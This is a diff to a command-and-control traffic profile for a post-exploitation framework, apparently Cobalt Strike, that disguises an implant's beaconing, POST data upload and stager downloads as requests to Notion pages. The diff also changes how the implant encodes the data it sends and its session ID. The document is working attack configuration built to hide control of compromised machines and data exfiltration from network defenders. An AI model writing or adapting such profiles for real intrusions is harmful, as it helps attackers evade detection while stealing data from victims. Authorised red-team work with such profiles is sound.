@@ -1,7 +1,7 @@
 # Notion Malleable C2
 # Author: HuskyHacks | @HuskyHacksMK
 # Derived from Google Drive malleable C2 profile by @bluscreenofjeff
-# 
+#
 #
 
 
@@ -71,11 +71,11 @@ http-get {
 }
 
 http-post {
-    
+
     # This URI can be anything that looks like a Notion URL page, like /RECIPES-67f47989c66344338d0de98221404ad3
     set uri "/RESEARCH-67f47989c66344338d0de98221404ad3";
     set verb "POST";
-    
+
     client {
 
         header "Accept" "text/html,application/xml;*/*;";
@@ -89,14 +89,13 @@ http-post {
 
         output {
             base64url;
-            netbios;
-            base64url;
-            parameter "u";
+            parameter "block";
         }
 
         #session ID
         id {
-            parameter "block";
+            base64url;
+	    parameter "id";
         }
     }
 
@@ -120,10 +119,10 @@ http-post {
 
 #change the stager server
 http-stager {
-    
+
     set uri_x86 "/RECIPES-67f47989c66344338d0de98221404ad3";
     set uri_x64 "/BLOGIDEAS-67f47989c66344338d0de98221404ad3";
-    
+
     server {
         header "Content-Type" "application/json; charset=utf-8";
         header "Cache-Control" "no-cache, no-store, max-age=0, must-revalidate";
